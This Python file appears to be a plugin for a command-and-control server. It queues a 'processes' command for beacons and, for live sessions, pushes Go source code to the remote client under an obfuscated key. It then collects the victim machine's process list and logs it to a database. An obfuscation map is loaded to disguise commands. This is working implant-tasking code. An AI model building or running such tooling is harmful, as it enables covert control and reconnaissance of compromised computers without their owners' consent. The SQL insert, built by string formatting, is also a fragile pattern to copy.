"""Processes plugin for beacon and session.

Imports are written to work both when executing from the project root
as well as when running the server from inside src/Server.
"""

from Modules.beacon.beacon import add_beacon_command_list
from Modules.global_objects import logger, config, obfuscation_map
from ServerDatabase.database import DatabaseClass
from Modules.session.transfer import send_data, receive_data

from datetime import datetime
import json
from pathlib import Path


class Processes:
    def __init__(self):
        self.command = "processes"

        obfuscation: dict = {}
        try:
            obf_path = Path(__file__).with_name("obfuscate.json")
            with obf_path.open("r", encoding="utf-8") as f:
                obfuscation = json.load(f)
        except Exception as e:
            logger.error(
                f"Processes: could not load obfuscate.json (falling back to plain command). Error: {e}"
            )
        if obfuscation:
            try:
                obfuscation_map.update(obfuscation)
            except Exception:
                pass

        self.database = DatabaseClass(config, "command_database")

    def beacon(self, beacon: dict) -> None:
        """Queue processes command for a beacon by userID."""
        add_beacon_command_list(beacon.userID, None, self.command, self.database, "")
        logger.debug(
            f"Processes command added to command list for userID: {beacon.userID}"
        )

    def session(self, session: dict) -> None:
        """Request processes from a live session and store the result."""
        logger.info(f"Requesting processes from {session['userID']}")

        # Read the Go source code
        source_path = Path(__file__).with_name("main.go")
        with source_path.open("r", encoding="utf-8") as f:
            source_code = f.read()

        # Create the module data
        module_data = {
            "name": self.command,
            "data": source_code,
        }

        # Send the module data to the client, using the obfuscated module name
        send_data(session["conn"], json.dumps({"3rff": json.dumps(module_data)}))

        data = receive_data(session["conn"])
        self.database.insert_entry(
            "Processes",
            f'"{session["userID"]}", "{data.replace('"', '""')}", "{datetime.now()}"',
        )
        print(data)
